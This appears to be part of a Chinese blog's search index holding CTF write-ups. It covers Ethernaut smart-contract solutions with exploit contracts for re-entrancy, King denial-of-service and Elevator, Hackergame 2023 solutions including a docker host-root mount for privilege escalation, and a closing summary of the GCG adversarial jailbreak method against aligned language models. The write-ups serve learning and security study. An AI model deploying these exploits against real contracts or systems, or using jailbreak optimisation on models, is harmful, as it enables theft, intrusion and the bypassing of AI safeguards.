'0x412076657279207374726f6e67207365637265742070617373776f7264203a29' > web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) 'A very strong secret password :)' > await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) // \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb","title":"Vault"},{"location":"ctf/writeups/ethernaut/#king","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract King { address payable king ; uint public prize ; address payable public owner ; constructor () public payable { owner = msg.sender ; king = msg.sender ; prize = msg.value ; } receive () external payable { require ( msg.value >= prize || msg.sender == owner ); king . transfer ( msg.value ); king = msg.sender ; prize = msg.value ; } function _king () public view returns ( address payable ) { return king ; } } \u5728\u66f4\u6362king\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u4f59\u989d\u8f6c\u5230\u4e0a\u4e00\u4efbking\uff0c\u53ea\u8981\u9009\u62e9\u4e0d\u63a5\u53d7\uff0c\u5373\u53ef\u4e0d\u5b8c\u6210\u6362\u4efb\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528revert\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor ( address challenge ) public payable { challenge . call { value : msg.value }( \"\" ); } fallback () external { revert (); } } \u53ea\u8981\u8f6c\u7684\u94b1\u6bd4prize(1300889614901161 wei)\u591a\u5c31\u53ef\u4ee5\u4e86\u3002","title":"King"},{"location":"ctf/writeups/ethernaut/#re-entrancy","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.12 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg.value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg.sender ] >= _amount ) { ( bool result ,) = msg.sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg.sender ] -= _amount ; } } receive () external payable {} } \u8fd9\u9898\u8003\u5bdf\u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3awithdraw\u662f\u5148\u8f6c\u8d26\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528receive\u6216fallback\u4e00\u76f4withdraw\u3002\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u540e\u6765\u53d1\u73b0\u662f\u6539\u4e86\u5408\u7ea6\u4ee3\u7801\u540e\u5fd8\u8bb0\u91cd\u65b0\u7f16\u8bd1\u4e86\uff0c\u6d6a\u8d39\u4e86\u597d\u591agas\u8d39qaq\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Reentrance */ contract Exploit { Reentrance challenge ; constructor ( address payable addr ) public payable { challenge = Reentrance ( addr ); } function exp () public { challenge . withdraw ( 0 . 001 ether ); } fallback () external payable { if ( address ( challenge ). balance >= 0 ) { challenge . withdraw ( 0 . 001 ether ); } } } \u6267\u884c\u5408\u7ea6\u524d\uff0c\u9700\u8981\u5148donate\u4fdd\u8bc1\u5408\u7ea6\u53ef\u4ee5\u53d6\u94b1\u3002 contract . donate . sendTransaction ( < exp contract addr > , { value : toWei ( \"0.001\" )})","title":"Re-entrancy"},{"location":"ctf/writeups/ethernaut/#elevator","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg.sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u8fd9\u9898\u5b66\u4e60\u4e86solidity\u4e2d\u63a5\u53e3\u7684\u4e00\u4e9b\u7528\u6cd5\uff0c\u6839\u636e\u9898\u76ee\u8be6\u89e3\u4e5f\u4e86\u89e3\u5230\u4e86view\u548cpure\u51fd\u6570\u4fee\u6539\u5668\u7684\u4f5c\u7528\uff0c\u53ef\u4ee5\u9632\u6b62\u72b6\u6001\u88ab\u7be1\u6539\uff0c\u4f46\u662f\u5373\u4f7f\u8fd9\u6837\uff0c\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u4e0d\u540c\u8f93\u5165\u5f97\u5230\u4e0d\u540c\u8f93\u51fa\u7684\u51fd\u6570\u89e3\u51fa\u672c\u9898\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Elevator */ contract Exploit { Elevator elevator ; bool top = true ; constructor ( address challenge ) public { elevator = Elevator ( challenge ); } function isLastFloor ( uint ) public returns ( bool ) { top = ! top ; // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c return top ; } function exp () public { elevator . goTo ( 1 ); } }","title":"Elevator"},{"location":"ctf/writeups/ethernaut/#privacy","text":"","title":"Privacy"},{"location":"ctf/writeups/hackergame2023/","text":"Hackergame 2023 \u00b6 \u7ea6 3143 \u4e2a\u5b57 222 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f Abstract \u8fd9\u6b21\u5fd9\u91cc\u5077\u95f2\u505a\u7684\uff0c\u8fd8\u803d\u6401\u4e86\u4e00\u4e9b\u4e8b\u513fqaq\u3002\u7b97\u662f\u7b2c\u4e00\u6b21partly\u5b8c\u6574\u5730\u53c2\u52a0Hackergame\uff0c\u56e0\u4e3a\u662f\u9762\u5411\u521d\u5b66\u8005\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u96be\u5ea6\u4e0d\u9ad8\u66f4\u5177\u6709\u8da3\u5473\u6027\uff0c\u7279\u6b64\u8bb0\u5f55\u4e00\u4e0b\u3002 \u4e00\u4e9b\u7b80\u5355\u7684\u9898\u76ee\u53ef\u80fd\u8bb0\u5f55\u7684\u4f1a\u6bd4\u8f83\u8349\u7387\uff0c\u4f1a\u91cd\u70b9\u8bb0\u5f55\u4e00\u4e9b\u5370\u8c61\u6df1\u523b\uff0c\u5dee\u4e00\u70b9\u5b8c\u6210\u7684\u9898\u76ee\u3002\u5bf9\u4e8e\u6ca1\u601d\u8def\u7684\u9898\u76ee\u4e5f\u7ed3\u5408\u516c\u5f00\u9898\u89e3\u8bb0\u5f55\u4e00\u4e0b\uff0c\u8865\u5145\u4e00\u4e0b\u76f8\u5173\u77e5\u8bc6\u3002 \u5b98\u65b9\u9898\u89e3 Hackergame \u542f\u52a8 \u00b6 \u7b7e\u5230\u9898\uff0c\u76f4\u63a5\u6539GET\u8bf7\u6c42\u53c2\u6570\u91cc\u7684Similarity \u732b\u54aa\u5c0f\u6d4b \u00b6 \u8003\u9a8c\u641c\u7d22\u80fd\u529b\uff0c\u90fd\u5f88\u597d\u641c\uff0cGoogle\u4e00\u4e0b\u4f60\u5c31\u77e5\u9053 \u66f4\u6df1\u66f4\u6697 \u00b6 \u9047\u4e8b\u4e0d\u51b3 F12\uff0c\u968f\u4fbf\u6eda\u4e00\u4e0b\u5c31\u627e\u5230\u4e86flag\uff08\u771f\u7684\uff0c\u90fd\u662f\u8fd0\u6c14 \u65c5\u884c\u7167\u7247 3.0 \u00b6 \u8fd8\u86ee\u6709\u610f\u601d\u7684\u793e\u5de5\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684 \u4ece\u65e5\u672c\u3001\u5b66\u672f\u4f1a\u8bae\u5165\u624b\uff0c\u5f88\u5bb9\u6613\u53d1\u73b0\u4f1a\u8bae\u540d\u79f0\u4ee5\u53ca\u5730\u70b9\u4e3a\u4e1c\u4eac\u5927\u5b66\uff0c\u6839\u636e\u5730\u56fe\u9a8c\u8bc1\u4e00\u4e0b\u5c31\u53d1\u73b0\u4e86\u90a3\u5bb6\u62c9\u9762\u9986\u3002 \u4e8e\u662f\u6839\u636e\u8981\u6c42\u67e5\u4e00\u4e0b\u4f1a\u8bae\u4e3e\u529e\u65e5\u671f\uff0c\u4ee5\u53ca\u4e1c\u4eac\u5927\u5b66\u8bfa\u8d1d\u5c14\u7269\u7406\u5b66\u5956\u83b7\u5f97\u8005\uff0c\u5f88\u5bb9\u6613\u89e3\u51fa\u7b2c\u4e00\u90e8\u5206\u7684\u7b54\u6848\u3002 \u7b2c\u4e8c\u90e8\u5206\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u6ca1\u60f3\u5230\u9644\u8fd1\u8d70\u8d70\u5c45\u7136\u8d70\u90a3\u4e48\u8fdc\uff0c\u8fd8\u662f\u9760\u4e0a\u91ce\u7ad9\u8fd9\u4e00\u4e2a\u5173\u952e\u5730\u70b9\u624d\u53d1\u73b0\u539f\u6765\u8d70\u4e86\u90a3\u4e48\u8fdc\uff0c\u90a3\u5c31\u5f88\u597d\u5b9a\u4f4d\u5230\u56fd\u7acb\u535a\u7269\u9986\u548c\u4e0a\u91ce\u516c\u56ed\u3002\u6839\u636e\u65e5\u671f\u548c\u5730\u70b9\u80fd\u641c\u5230\u4e00\u4e2a\u9152\u7684\u5c55\u89c8\u4f1a\uff0c\u7f51\u7ad9\u91cc\u627e\u5230Staff\u62db\u52df\uff0c\u7b2c\u4e8c\u90e8\u5206\u5c31\u5b8c\u6210\u4e86\u3002 \u7b2c\u4e09\u90e8\u5206\u7b2c\u4e00\u95ee\u76f4\u63a5\u770b\u4f1a\u8bae\u5b98\u7f51\u7684\u901a\u77e5\u5373\u53ef\uff0c\u7b2c\u4e8c\u90e8\u5206\uff0c\u6d77\u62a5\u76f4\u63a5\u4e0aTwitter\u641c\u4e86\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002\u5173\u4e8e 3D \u52a8\u7269\u7684\u8bdd\u80af\u5b9a\u6709\u76f8\u5173\u62a5\u9053\uff0c\u67e5\u4e86\u4e00\u4e0b\u6709\u732b\u6709\u72d7\uff0c\u8bd5\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002 \u8d5b\u535a\u4e95\u5b57\u68cb \u00b6 \u540e\u7aef\u6ca1\u6709\u505a\u4f4d\u7f6e\u662f\u5426\u5360\u7528\u68c0\u67e5\uff0c\u6240\u4ee5\u53ea\u8981\u7ed5\u8fc7\u524d\u7aef\u68c0\u67e5\u5c31\u80fd\u83b7\u5f97\u80dc\u5229\u3002 \u5976\u5976\u7684\u7761\u524d flag \u6545\u4e8b \u00b6 \u6839\u636e\u9898\u5e72\u63d0\u5230\u7684 Google\u4eb2\u513f\u5b50 \u731c\u6d4b\u548cPixels\u6709\u5173\uff0c\u5584\u7528\u641c\u7d22\u53d1\u73b0\u662fPixels\u7684\u56fe\u50cf\u88c1\u526a\u6f0f\u6d1e\uff0c\u76f4\u63a5\u5c06PNG\u6587\u4ef6\u7684END\u6570\u636e\u5757\u6dfb\u52a0\u5230\u76f8\u5e94\u4f4d\u7f6e\uff0c\u5e76\u6ca1\u6709\u5220\u9664\u88ab\u88c1\u526a\u7684\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u578b\u53f7\u4fee\u6539\u4e00\u4e0b\u957f\u5bbd\u5e76\u5220\u9664\u76f8\u5e94\u6570\u636e\u5757\u5373\u53ef\u3002 \u7f51\u4e0a\u5176\u5b9e\u6709\u76f8\u5e94\u5de5\u5177\u53ef\u4ee5\u4e00\u628a\u68ad\u3002 \u7ec4\u59d4\u4f1a\u6a21\u62df\u5668 \u00b6 \u7ec8\u4e8e\u6709\u4e00\u9053\u9700\u8981\u5199\u811a\u672c\u7684\u9898\u76ee\u4e86\uff08x \u76f4\u63a5F12\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u540e\u7aef\u662f\u4e00\u6b21\u6027\u628a\u6240\u6709\u6d88\u606f\u90fd\u53d1\u8fc7\u6765\uff0c\u90a3\u5c31\u5f88\u7b80\u5355\uff0c\u4e4b\u95f4\u627e\u51fa\u6ee1\u8db3\u8981\u6c42\u7684\u6d88\u606f\u7136\u540e\u53d1\u8d77\u64a4\u56de\u8bf7\u6c42\u5373\u53ef\u3002\u4e0d\u8fc7\u4e0d\u80fd\u4e00\u6b21\u6027\u90fd\u64a4\u56de\uff0c\u540e\u7aef\u6709Delay\u65f6\u95f4\u8981\u6c42\uff0c\u53ef\u4ee5\u6839\u636e\u6d88\u606f\u5185\u7684Delay\u4fe1\u606f\u5ef6\u8fdf\u540e\u53d1\u9001\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4e00\u76f4\u53d1\u9001\u76f4\u5230\u6210\u529f\u5373\u53ef\uff08\u4e3b\u8981\u7701\u529b\u65e0\u8111 \u89e3\u9898\u4ee3\u7801\uff08\u614e\u7528\uff0c\u6982\u7387\u4e8b\u4ef6\uff0c\u591a\u8bd5\u51e0\u6b21\u5c31\u597d\uff09 import requests import json from time import sleep cookies = { 'session' : 'token' } msg = requests . post ( 'http://202.38.93.111:10021/api/getMessages' , cookies = cookies ) msg = json . loads ( msg . text ) msg = msg [ 'messages' ] def back ( idx ): back = requests . post ( 'http://202.38.93.111:10021/api/deleteMessage' , cookies = cookies , json = { 'id' : idx }) try : back = json . loads ( back . text ) except : print ( 'err:' + back . text ) return back for id , i in enumerate ( msg ): if 'hack[' in i [ 'text' ]: t = back ( id ) # \u8fd9\u91cc\u53ef\u4ee5\u4f18\u5316\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u61d2\u764c\u72af\u4e86 while ( t . get ( 'error' ) == '\u68c0\u6d4b\u5230\u65f6\u7a7a\u7a7f\u8d8a' ): t = back ( id ) # print(id, t) flag = requests . post ( 'http://202.38.93.111:10021/api/getflag' , cookies = cookies ) flag = json . loads ( flag . text ) print ( flag ) \u866b \u00b6 \u771f\u662f\u975e\u5e38\u5de7\uff0c\u4e4b\u524d\u5c31\u5237\u5230\u8fc7\u65e0\u7ebf\u7535\u3001SSTV\u76f8\u5173\u7684\u77e5\u8bc6\uff0c\u8fd9\u6b21\u5c45\u7136\u521a\u597d\u78b0\u4e0a\u4e86\uff0c\u4e0d\u8fc7Windows\u7aef\u90a3\u4e2a\u8f6f\u4ef6\u4e0d\u600e\u4e48\u4f1a\u7528\uff0c\u770b\u5230\u624b\u673a\u7aef\u6709\u76f8\u5e94\u7684\u50bb\u74dc\u5f0f\u6536\u53d1\u8f6f\u4ef6\uff08\u4e0d\u8fc7\u662fAndroid\uff0c\u4e8e\u662f\u62ff\u51fa\u4e86\u5907\u7528\u673a\uff09\u5f88\u8f7b\u677e\u83b7\u5f97\u4e86\u7ed3\u679c\u3002 \u4e0d\u653e\u56fe\u4e86\uff0c\u5360\u4ed3\u5e93\u7a7a\u95f4\uff0c\u7b49\u4ee5\u540e\u641e\u4e2a\u56fe\u5e8a\u6216SVG JSON \u2282 YAML? \u00b6 \u5b66\u4e60\u4e86\u4e00\u4e0b Yaml\uff0c\u6839\u636eYaml 1.1\u4e0e1.2\u7684\u5dee\u5f02\uff0c\u53d1\u73b0Yaml 1.1\u65e0\u6cd5\u89e3\u6790\u5f62\u5982 1e3 \u8fd9\u6837\u7684\u6570\u5b57\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\uff0c\u8fd9\u6837\u7b2c\u4e00\u5c0f\u95ee\u5c31\u89e3\u51b3\u4e86\u3002 \u7b2c\u4e8c\u5c0f\u95ee\u6839\u636e\u641c\u7d22\u5f97\u5230 \u8fd9\u4e2a\u95ee\u9898 \u53ef\u77e5\u9053Yaml\u8981\u6c42\u952e\u503c\u662f\u552f\u4e00\u7684\u5426\u5219\u4f1a\u62a5\u9519\uff0c\u800cJSON\u6ca1\u6709\u8fd9\u4e2a\u8981\u6c42\uff0c\u8fd9\u6837\u5c31\u89e3\u5b8c\u4e86\u3002 Git? Git! \u00b6 \u8fd9\u9898\u975e\u5e38\u7684easy\uff0c\u76f4\u63a5 git reflog \uff0c\u518d git reset \u5c31\u7ed3\u675f\u4e86\u3002 HTTP \u96c6\u90ae\u518c \u00b6 \u5927\u81f4\u5c31\u662f\u4e0d\u65ad\u67e5\u6587\u6863\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u642c\u5b98\u65b9\u9898\u89e3\u4e86 \u5b98\u65b9\u9898\u89e3 200 OK. \u70b9\u51fb\u5c31\u9001\uff0c\u4ee3\u8868\u8bf7\u6c42\u6210\u529f\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 404 Not Found. \u4fee\u6539\u8def\u5f84\u5230\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u5373\u53ef\u3002 GET /x HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 400 Bad Request. \u6784\u9020\u4e0d\u7b26\u5408\u683c\u5f0f\u7684 HTTP \u8bf7\u6c42\u5373\u53ef\u3002 GET / aHTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 505 HTTP Version Not Supported. \u4fee\u6539 HTTP \u7248\u672c\u53f7\u5230\u4e00\u4e2a\u79bb\u8c31\u7684\u503c\u5373\u53ef\u3002 GET / HTTP/11\\r\\n Host: example.com\\r\\n\\r\\n 405 Method Not Allowed. \u4fee\u6539\u8bf7\u6c42\u65b9\u6cd5\u5230 POST \u7b49\u5373\u53ef\u3002 POST / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n \u63a5\u4e0b\u6765\u662f\u53ef\u80fd\u9700\u8981\u770b\u6587\u6863\u7684\u90e8\u5206\uff1a 100 Continue. \u4ee3\u8868\u670d\u52a1\u5668\u5e0c\u671b\u5ba2\u6237\u7aef\u7ee7\u7eed\u8bf7\u6c42\u6216\u8005\u5ffd\u7565\u3002\u9700\u8981\u5ba2\u6237\u7aef\u53d1\u9001 Expect: 100-continue \u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Expect: 100-continue\\r\\n\\r\\n 206 Partial Content. \u4e00\u4e2a HTTP \u8bf7\u6c42\u53ef\u4ee5\u53ea\u8bf7\u6c42\u90e8\u5206\u5185\u5bb9\uff0c\u670d\u52a1\u5668\u4e5f\u4f1a\u8fd4\u56de\u90e8\u5206\u5185\u5bb9\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=1-2\\r\\n\\r\\n 416 Range Not Satisfiable. \u4e0a\u9762\u7684 Range \u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u8303\u56f4\uff0c\u90a3\u4e48\u4e0d\u5408\u6cd5\u7684\u8303\u56f4\u5462\uff1f\u5c31\u662f 416\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=114514-1919810\\r\\n\\r\\n 304 Not Modified. \u4ee3\u8868\u6587\u4ef6\u5728\u6307\u5b9a\u6761\u4ef6\u4e0b\u6ca1\u6709\u4fee\u6539\u8fc7\uff0c\u8fd9\u91cc\u7528 If-Modified-Since \uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\\r\\n\\r\\n 412 Precondition Failed. \u8fd9\u4e2a payload \u4f7f\u7528\u4e86 ETag + If-Match\uff0cETag \u548c\u5bf9\u5e94\u7684 web \u8d44\u6e90\u5bf9\u5e94\uff0c\u7528\u6765\u533a\u5206\u5bf9\u5e94\u8d44\u6e90\u4e0d\u540c\u7684\u7248\u672c\u3002\u5ba2\u6237\u7aef\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4fe1\u606f\u6765\u8282\u7701\u5e26\u5bbd\u3002\u8fd9\u91cc If-Match \u5219\u5728\u5c1d\u8bd5\u5339\u914d\u8fd9\u4e2a ETag\uff0c\u5982\u679c\u4e0d\u5339\u914d\uff0c\u90a3\u5c31\u8fd4\u56de 412\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Match: \"bfc13a64729c4290ef5b2c2730249c88ca92d82d\"\\r\\n\\r\\n 413 Content Too Large. \u4e0d\u9700\u8981\u771f\u6b63\u8f93\u5165\u5f88\u5927\u7684 payload\uff0c\u628a Content-length \u5f04\u5f97\u5f88\u5927\u5c31\u884c\uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-length: 1145141919810\\r\\n\\r\\n 414 URI Too Long. \u5927\u6982\u9700\u8981\u5f88\u957f\u7684 URI \u8def\u5f84\uff08\u4f46\u662f\u53c8\u4e0d\u80fd\u592a\u957f\uff0c\u5426\u5219 web \u754c\u9762\u672c\u4f53\u4e0d\u4f1a\u5141\u8bb8\u8fd9\u6837\u7684\u54cd\u5e94\uff09\u3002\u5185\u5bb9\u8be6\u89c1 414.txt \u3002 \u4ee5\u4e0a\u5c31\u5df2\u7ecf\u96c6\u6ee1\u4e86 12 \u4e2a\u3002\u5728\u9a8c\u9898\u65f6\u8fd8\u6709\u4e00\u4e2a HTTP code \u6f0f\u4e86\uff1a 501 Not Implemented. \u4ee3\u8868\u670d\u52a1\u5668\u4e0d\u652f\u6301\u6b64\u529f\u80fd\u3002Nginx \u6e90\u4ee3\u7801\u4e2d\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u552f\u4e00\u53ef\u80fd\u89e6\u53d1\u7684\u5730\u65b9\u662f https://github.com/nginx/nginx/blob/a13ed7f5ed5bebdc0b9217ffafb75ab69f835a84/src/http/ngx_http_request.c#L2008 : } else { ngx_log_error ( NGX_LOG_INFO , r -> connection -> log , 0 , \"client sent unknown \\\" Transfer-Encoding \\\" : \\\" %V \\\" \" , & r -> headers_in . transfer_encoding -> value ); ngx_http_finalize_request ( r , NGX_HTTP_NOT_IMPLEMENTED ); return NGX_ERROR ; } else \u4e0a\u9762\u53ea\u5141\u8bb8 chunked \uff0c\u6240\u4ee5\u53ef\u4ee5\uff1a GET / HTTP/1.1\\r\\n Transfer-Encoding: gzip\\r\\n Host: example.com\\r\\n\\r\\n gzip \u6362\u6210\u9664\u4e86 chunked \u4ee5\u5916\u7684\u4efb\u610f\u5b57\u7b26\u4e32\u90fd\u884c\u3002 \u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff1a\u6ca1\u6709\u72b6\u6001\u7801\u662f\u600e\u4e48\u56de\u4e8b\uff1f GET /\\r\\n \u8fd9\u91cc\u5b9e\u9645\u53d1\u9001\u7684\u662f HTTP/0.9 \u8bf7\u6c42\uff0c\u5b83\u53ea\u652f\u6301 GET \uff0c\u7136\u540e\u540e\u9762\u76f4\u63a5\u63a5 URL\uff0c\u6ca1\u6709\u522b\u7684\u3002\u7136\u540e\u54cd\u5e94\u5c31\u76f4\u63a5\u54cd\u5e94\u6587\u4ef6\u5185\u5bb9\uff0c\u4e5f\u6ca1\u6709\u72b6\u6001\u7801\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002 Docker for Everyone \u00b6 \u8fd9\u9898\u8003\u70b9\u5c31\u662fdocker\u7528\u6237\u7ec4\u4e0eroot\u5176\u5b9e\u662f\u7b49\u4ef7\u7684\uff0c\u56e0\u6b64\u76f4\u63a5\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u628aflag\u6302\u8f7d\u8fdb\u5bb9\u5668\u5373\u53ef\u5728\u5bb9\u5668\u5185\u8bfb\u53d6\u3002\u53e6\u5916\u6ce8\u610f\u4e00\u4e0b\u8f6f\u8fde\u63a5\u7684\u95ee\u9898\u5373\u53ef\u3002 docker run -it --rm -v /:/outside alpine \u60dc\u5b57\u5982\u91d1 2.0 \u00b6 \u76f4\u63a5\u66b4\u529b\u7a77\u4e3e\u5373\u53ef\uff0c\u5176\u5b9e\u6ee1\u8db3\u6761\u4ef6\u7684\u60c5\u51b5\u5f88\u591a\uff0c\u76f4\u63a5\u8fb9\u8dd1\u8fb9\u8f93\u51fa\u5c31\u5f88\u5feb\u80fd\u62ff\u5230flag\u4e86\u3002 \u89e3\u9898\u4ee3\u7801\uff08\u8fc7\u4e8e\u66b4\u529b\uff09 cod_dict = [] cod_dict += [ 'nymeh1niwemflcir}echaet' ] cod_dict += [ 'a3g7}kidgojernoetlsup?h' ] cod_dict += [ 'ulw!f5soadrhwnrsnstnoeq' ] cod_dict += [ 'ct{l-findiehaai{oveatas' ] cod_dict += [ 'ty9kxborszstguyd?!blm-p' ] def get_cod_dict ( c_dict ): return '' . join ( c_dict ) def decrypt_data ( input_codes ): flags = [] for k in range ( 23 ): print ( k ) for j in range ( 23 ): for t in range ( 23 ): for p in range ( 23 ): for f in range ( 23 ): cd_dict = cod_dict . copy () cd_dict [ 0 ] = cod_dict [ 0 ][: k ] + cod_dict [ 0 ][ k ] + cod_dict [ 0 ][ k :] cd_dict [ 1 ] = cod_dict [ 1 ][: j ] + cod_dict [ 1 ][ j ] + cod_dict [ 1 ][ j :] cd_dict [ 2 ] = cod_dict [ 2 ][: t ] + cod_dict [ 2 ][ t ] + cod_dict [ 2 ][ t :] cd_dict [ 3 ] = cod_dict [ 3 ][: p ] + cod_dict [ 3 ][ p ] + cod_dict [ 3 ][ p :] cd_dict [ 4 ] = cod_dict [ 4 ][: f ] + cod_dict [ 4 ][ f ] + cod_dict [ 4 ][ f :] print ( cd_dict ) st_dict = get_cod_dict ( cd_dict ) output_chars = [ st_dict [ c ] for c in input_codes ] if 'flag{' in '' . join ( output_chars ): flags . append ( '' . join ( output_chars )) return flags flags = decrypt_data ([ 53 , 41 , 85 , 109 , 75 , 1 , 33 , 48 , 77 , 90 , 17 , 118 , 36 , 25 , 13 , 89 , 90 , 3 , 63 , 25 , 31 , 77 , 27 , 60 , 3 , 118 , 24 , 62 , 54 , 61 , 25 , 63 , 77 , 36 , 5 , 32 , 60 , 67 , 113 , 28 ]) print ( set ( flags )) \ud83e\ude90 \u9ad8\u9891\u7387\u661f\u7403 \u00b6 \u9898\u76ee\u4e2d\u7ed9\u7684\u662fasciinema\u5f55\u50cf\u6587\u4ef6\uff0c\u76f4\u63a5 asciinema cat \u5373\u53ef\u5f97\u5230\u5b57\u8282\u6d41\uff0c\u4e0d\u8fc7\u4f1a\u6709\u5f88\u591a\u989d\u5916\u4e0d\u9700\u8981\u7684\u4e1c\u897f\uff0c\u5220\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\uff0c\u770b\u5230asciinema\u5f55\u5236\u7684\u65f6\u5019\u6709raw\u9009\u9879\uff0c\u4e8e\u662f\u91cd\u65b0\u5f55\u4e86\u4e00\u904d\uff0c\u8fd9\u6837\u5b57\u8282\u6d41\u5c31\u5e72\u51c0\u5f88\u591a\uff0c\u7a0d\u5fae\u6539\u4e00\u4e0b\uff0c\u8fd0\u884c\u5373\u53ef\u3002 \ud83e\ude90 \u5c0f\u578b\u5927\u8bed\u8a00\u6a21\u578b\u661f\u7403 \u00b6 \u5f88\u65b0\u9896\u7684AI\u9898\u76ee\uff0c\u5bf9\u4e8e\u6211\u6765\u8bf4\u53ea\u80fd\u4e71\u8bd5\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u7528repeat\u5927\u6cd5\u5c31\u53ef\u5b8c\u6210\u3002 \u7b2c\u4e8c\u95ee\u5176\u5b9e\u601d\u8def\u5bf9\u7684\uff0c\u4e0d\u8fc7\u6211\u5acc\u9ebb\u70e6\uff0c\u6ca1\u6709\u53bb\u7a77\u4e3ehhh\u3002 \u540e\u9762\u4e24\u95ee\u786e\u5b9e\u53ef\u4ee5\u7684\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 LLM Attacks \u00b6 \u8bba\u6587\uff1a Universal and Transferable Adversarial Attacks on Aligned Language Models Background \u00b6 \u4e00\u4e2a Decoder-Only \u7684 LLM \u5c06\u4e00\u4e32 token \\(x_{1:n}\\) \u6620\u5c04\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u3002\u8bed\u8a00\u6a21\u578b\u6240\u9700\u8981\u5b66\u4e60\u7684\u5219\u662f\u5728\u7ed9\u5b9a\u4e4b\u524d\u7684 token \\(x_{1:n}\\) \uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u7684\u6982\u7387 \\(p(x_{n+1} | x_{1:n})\\) \u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a \\(x_i \\in {1, ... V}\\) \u90fd\u662f\u8bcd\u8868\u4e2d\u7684\u4e00\u4e2a token\u3002\u5982\u679c\u60f3\u8981\u8ba9\u6a21\u578b\u8f93\u5165\u4e00\u6bb5\u5e8f\u5217\uff0c\u5e8f\u5217\u4e2d\u6bcf\u4e00\u4e2a token \u90fd\u53ea\u4e0e\u4e4b\u524d\u7684\u6240\u6709 token \u6709\u5173\uff0c\u56e0\u6b64\u6a21\u578b\u8f93\u51fa\u4e00\u6bb5\u5e8f\u5217 \\(x_{n+1:n+H}\\) \u7684\u6982\u7387\u4e3a \\[p(x_{n+1:n+H}|x_{1:n}) = \\prod_{i=1}^H p(x_{n+i} | x_{1:n+i-1})\\] Method \u00b6 \u5982\u679c\u6211\u4eec\u5e0c\u671b\u6a21\u578b\u80fd\u591f\u8f93\u51fa\u4e00\u4e2a\u6307\u5b9a\u7684\u5e8f\u5217\uff0c\u5c31\u662f\u5e0c\u671b \\(p(x_{n+1:n+H}|x_{1:n})\\) \u5c3d\u53ef\u80fd\u9ad8\uff0c\u4ee5\u6b64\u51fa\u53d1\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4f18\u5316\u76ee\u6807 \\[\\mathcal{L}(x_{1:n}) = -\\log p(x^\\star_{n+1:n+H} | x_{1:n})\\] 